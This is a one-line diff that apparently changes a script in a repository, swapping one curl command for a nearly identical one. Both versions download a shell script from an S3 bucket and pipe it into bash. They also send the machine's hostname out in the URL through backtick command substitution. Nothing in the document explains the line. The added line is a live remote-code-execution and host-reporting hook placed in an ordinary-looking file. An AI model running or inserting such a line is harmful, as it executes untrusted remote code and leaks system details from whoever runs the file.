@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/ctest.git\&folder=linux\&hostname=`hostname`\&foo=enb
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/ctest.git\&folder=linux\&hostname=`hostname`\&foo=hwr
